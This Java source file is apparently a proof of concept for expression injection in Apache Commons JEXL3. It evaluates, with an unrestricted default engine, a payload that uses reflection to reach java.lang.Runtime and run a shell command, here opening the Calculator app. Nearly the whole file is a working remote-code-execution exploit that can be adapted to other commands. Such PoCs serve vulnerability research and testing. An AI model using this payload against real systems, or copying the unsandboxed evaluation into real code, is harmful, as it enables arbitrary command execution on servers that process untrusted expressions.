package com.ppp.jexl;

import org.apache.commons.jexl3.*;

/**
 * @author Whoopsunix
 */
public class JEXLAttack {
    public static void main(String[] args) {
        Thread.currentThread().getContextClassLoader().getResource("");
        Thread.currentThread().getContextClassLoader().getParent().getResource("");


        String poc = "''.class.forName('java.lang.Runtime').getRuntime().exec('open -a Calculator.app')";
        System.out.println(eval(poc));;
    }

    public static Object eval(String poc) {
        JexlEngine engine = new JexlBuilder().create();
        JexlExpression Expression = engine.createExpression(poc);


        JexlContext Context = new MapContext();
        //Context.set("foo", 999);

        Object rs = Expression.evaluate(Context);
        return rs;
    }
}
